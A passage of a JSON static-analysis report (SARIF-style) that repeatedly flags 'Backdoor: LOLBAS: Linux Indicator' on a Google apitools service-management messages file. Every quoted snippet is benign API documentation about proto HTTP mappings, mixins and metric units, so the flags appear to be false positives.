                  "endLine": 1457,
                  "endColumn": 67,
                  "snippet": {
                    "text": "  implies that all methods in `AccessControl` are also declared with same name\n  and request/response types in `Storage`. A documentation generator or\n  annotation processor will see the effective `Storage.GetAcl` method after\n  inherting documentation and annotations as follows:      service Storage {\n  // Get the underlying ACL object.       rpc GetAcl(GetAclRequest) returns\n  (Acl) {         option (google.api.http).get = \"/v2/{resource=**}:getAcl\";\n  }       ...     }  Note how the version in the path pattern changed from\n",
                    "rendered": {
                      "text": "  implies that all methods in `AccessControl` are also declared with same name\n  and request/response types in `Storage`. A documentation generator or\n  annotation processor will see the effective `Storage.GetAcl` method after\n  inherting documentation and annotations as follows:      service Storage {\n  // Get the underlying ACL object.       rpc GetAcl(GetAclRequest) returns\n  (Acl) {         option (google.api.http).get = \"/v2/{resource=**}:getAcl\";\n  }       ...     }  Note how the version in the path pattern changed from\n",
                      "markdown": "`  implies that all methods in `AccessControl` are also declared with same name\n  and request/response types in `Storage`. A documentation generator or\n  annotation processor will see the effective `Storage.GetAcl` method after\n  inherting documentation and annotations as follows:      service Storage {\n  // Get the underlying ACL object.       rpc GetAcl(GetAclRequest) returns\n  (Acl) {         option (google.api.http).get = \"/v2/{resource=**}:getAcl\";\n  }       ...     }  Note how the version in the path pattern changed from\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1449,
                  "startColumn": 1,
                  "endLine": 1449,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n  // Get a data record.       rpc GetData(GetDataRequest) returns (Data) {\n  option (google.api.http).get = \"/v2/{resource=**}\";       }     }  Example\n  of a mixin configuration:      apis:     - name: google.storage.v2.Storage\n",
                    "rendered": {
                      "text": "  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n  // Get a data record.       rpc GetData(GetDataRequest) returns (Data) {\n  option (google.api.http).get = \"/v2/{resource=**}\";       }     }  Example\n  of a mixin configuration:      apis:     - name: google.storage.v2.Storage\n",
                      "markdown": "`  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n  // Get a data record.       rpc GetData(GetDataRequest) returns (Data) {\n  option (google.api.http).get = \"/v2/{resource=**}\";       }     }  Example\n  of a mixin configuration:      apis:     - name: google.storage.v2.Storage\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1446,
                  "startColumn": 1,
                  "endLine": 1446,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n  path if specified.  Example of a simple mixin:      package google.acl.v1;\n  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n",
                    "rendered": {
                      "text": "  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n  path if specified.  Example of a simple mixin:      package google.acl.v1;\n  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n",
                      "markdown": "`  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n  path if specified.  Example of a simple mixin:      package google.acl.v1;\n  service AccessControl {       // Get the underlying ACL object.       rpc\n  GetAcl(GetAclRequest) returns (Acl) {         option (google.api.http).get =\n  \"/v1/{resource=**}:getAcl\";       }     }      package google.storage.v2;\n  service Storage {       //       rpc GetAcl(GetAclRequest) returns (Acl);\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1441,
                  "startColumn": 8,
                  "endLine": 1441,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  options are inherited as follows:  - If after comment and whitespace\n  stripping, the documentation   string of the redeclared method is empty, it\n  will be inherited   from the original method.  - Each annotation belonging\n  to the service config (http,   visibility) which is not set in the\n  redeclared method will be   inherited.  - If an http annotation is\n  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n",
                    "rendered": {
                      "text": "  options are inherited as follows:  - If after comment and whitespace\n  stripping, the documentation   string of the redeclared method is empty, it\n  will be inherited   from the original method.  - Each annotation belonging\n  to the service config (http,   visibility) which is not set in the\n  redeclared method will be   inherited.  - If an http annotation is\n  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n",
                      "markdown": "`  options are inherited as follows:  - If after comment and whitespace\n  stripping, the documentation   string of the redeclared method is empty, it\n  will be inherited   from the original method.  - Each annotation belonging\n  to the service config (http,   visibility) which is not set in the\n  redeclared method will be   inherited.  - If an http annotation is\n  inherited, the path pattern will be   modified as follows. Any version\n  prefix will be replaced by the   version of the including API plus the root\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1395,
                  "startColumn": 39,
                  "endLine": 1395,
                  "endColumn": 45,
                  "snippet": {
                    "text": "      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n    METRIC_KIND_UNSPECIFIED = 0\n",
                    "rendered": {
                      "text": "      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n    METRIC_KIND_UNSPECIFIED = 0\n",
                      "markdown": "`      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n    METRIC_KIND_UNSPECIFIED = 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1394,
                  "startColumn": 41,
                  "endLine": 1394,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    Values:\n      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Values:\n      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n",
                      "markdown": "`    Values:\n      METRIC_KIND_UNSPECIFIED: Do not use this default value.\n      GAUGE: Instantaneous measurements of a varying quantity.\n      DELTA: Changes over non-overlapping time intervals.\n      CUMULATIVE: Cumulative value over time intervals that can overlap. The\n        overlapping intervals must have the same start time.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1368,
                  "startColumn": 5,
                  "endLine": 1368,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n      `Ti`    tebi    (2**40)  **Grammar**  The grammar includes the\n",
                    "rendered": {
                      "text": "      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n      `Ti`    tebi    (2**40)  **Grammar**  The grammar includes the\n",
                      "markdown": "`      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n      `Ti`    tebi    (2**40)  **Grammar**  The grammar includes the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1367,
                  "startColumn": 51,
                  "endLine": 1367,
                  "endColumn": 57,
                  "snippet": {
                    "text": "      (10**3) * `M`     mega    (10**6) * `G`     giga    (10**9) * `T`\n      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n",
                    "rendered": {
                      "text": "      (10**3) * `M`     mega    (10**6) * `G`     giga    (10**9) * `T`\n      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n",
                      "markdown": "`      (10**3) * `M`     mega    (10**6) * `G`     giga    (10**9) * `T`\n      tera    (10**12) * `P`     peta    (10**15) * `E`     exa     (10**18) *\n      `Z`     zetta   (10**21) * `Y`     yotta   (10**24) * `m`     milli\n      (10**-3) * `u`     micro   (10**-6) * `n`     nano    (10**-9) * `p`\n      pico    (10**-12) * `f`     femto   (10**-15) * `a`     atto\n      (10**-18) * `z`     zepto   (10**-21) * `y`     yocto   (10**-24) * `Ki`\n      kibi    (2**10) * `Mi`    mebi    (2**20) * `Gi`    gibi    (2**30) *\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1341,
                  "startColumn": 38,
                  "endLine": 1341,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      of this metric type. For example, the\n      `compute.googleapis.com/instance/network/received_bytes_count` metric\n      type has a label, `loadbalanced`, that specifies whether the traffic was\n      received through a load balanced IP address.\n    metricKind: Whether the metric records instantaneous values, changes to a\n      value, etc.\n    name: Resource name. The format of the name may vary between different\n",
                    "rendered": {
                      "text": "      of this metric type. For example, the\n      `compute.googleapis.com/instance/network/received_bytes_count` metric\n      type has a label, `loadbalanced`, that specifies whether the traffic was\n      received through a load balanced IP address.\n    metricKind: Whether the metric records instantaneous values, changes to a\n      value, etc.\n    name: Resource name. The format of the name may vary between different\n",
                      "markdown": "`      of this metric type. For example, the\n      `compute.googleapis.com/instance/network/received_bytes_count` metric\n      type has a label, `loadbalanced`, that specifies whether the traffic was\n      received through a load balanced IP address.\n    metricKind: Whether the metric records instantaneous values, changes to a\n      value, etc.\n    name: Resource name. The format of the name may vary between different\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1232,
                  "startColumn": 42,
                  "endLine": 1232,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n",
                      "markdown": "`\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1231,
                  "startColumn": 39,
                  "endLine": 1231,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\n\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n",
                    "rendered": {
                      "text": "\n\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n",
                      "markdown": "`\n\nclass ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1134,
                  "startColumn": 31,
                  "endLine": 1134,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n  Fields:\n    nextPageToken: The token of the next page of results.\n    serviceConfigs: The list of service config resources.\n  \"\"\"\n\n  nextPageToken = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "\n  Fields:\n    nextPageToken: The token of the next page of results.\n    serviceConfigs: The list of service config resources.\n  \"\"\"\n\n  nextPageToken = _messages.StringField(1)\n",
                      "markdown": "`\n  Fields:\n    nextPageToken: The token of the next page of results.\n    serviceConfigs: The list of service config resources.\n  \"\"\"\n\n  nextPageToken = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1027,
                  "startColumn": 50,
                  "endLine": 1027,
                  "endColumn": 59,
                  "snippet": {
                    "text": "  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n  (google.api.http) = {       get: \"/v1/messages/{message_id}\"\n  additional_bindings {         get:\n",
                    "rendered": {
                      "text": "  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n  (google.api.http) = {       get: \"/v1/messages/{message_id}\"\n  additional_bindings {         get:\n",
                      "markdown": "`  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n  (google.api.http) = {       get: \"/v1/messages/{message_id}\"\n  additional_bindings {         get:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1016,
                  "startColumn": 1,
                  "endLine": 1016,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n  text = 2; } ```  The following HTTP JSON to RPC mapping is enabled:  HTTP |\n",
                    "rendered": {
                      "text": "  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n  text = 2; } ```  The following HTTP JSON to RPC mapping is enabled:  HTTP |\n",
                      "markdown": "`  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n  text = 2; } ```  The following HTTP JSON to RPC mapping is enabled:  HTTP |\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1004,
                  "startColumn": 23,
                  "endLine": 1004,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n  \"message\"     };   } } message UpdateMessageRequest {   string message_id =\n",
                    "rendered": {
                      "text": "  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n  \"message\"     };   } } message UpdateMessageRequest {   string message_id =\n",
                      "markdown": "`  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n  \"message\"     };   } } message UpdateMessageRequest {   string message_id =\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 978,
                  "startColumn": 68,
                  "endLine": 979,
                  "snippet": {
                    "text": "\"google/api/annotations.proto\" for details.  The mapping consists of a field\n  specifying the path template and method kind.  The path template can refer\n  to fields in the request message, as in the example below which describes a\n  REST GET operation on a resource collection of messages:  ```proto service\n  Messaging {   rpc GetMessage(GetMessageRequest) returns (Message) {\n  option (google.api.http).get = \"/v1/messages/{message_id}/{sub.subfield}\";\n  } } message GetMessageRequest {   message SubMessage {     string subfield =\n  1;   }   string message_id = 1; // mapped to the URL   SubMessage sub = ",
                    "rendered": {
                      "text": "\"google/api/annotations.proto\" for details.  The mapping consists of a field\n  specifying the path template and method kind.  The path template can refer\n  to fields in the request message, as in the example below which describes a\n  REST GET operation on a resource collection of messages:  ```proto service\n  Messaging {   rpc GetMessage(GetMessageRequest) returns (Message) {\n  option (google.api.http).get = \"/v1/messages/{message_id}/{sub.subfield}\";\n  } } message GetMessageRequest {   message SubMessage {     string subfield =\n  1;   }   string message_id = 1; // mapped to the URL   SubMessage sub = ",
                      "markdown": "`\"google/api/annotations.proto\" for details.  The mapping consists of a field\n  specifying the path template and method kind.  The path template can refer\n  to fields in the request message, as in the example below which describes a\n  REST GET operation on a resource collection of messages:  ```proto service\n  Messaging {   rpc GetMessage(GetMessageRequest) returns (Message) {\n  option (google.api.http).get = \"/v1/messages/{message_id}/{sub.subfield}\";\n  } } message GetMessageRequest {   message SubMessage {     string subfield =\n  1;   }   string message_id = 1; // mapped to the URL   SubMessage sub = `"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 37,
                  "endLine": 797,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n",
                      "markdown": "`\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 796,
                  "startColumn": 55,
                  "endLine": 796,
                  "endColumn": 64,
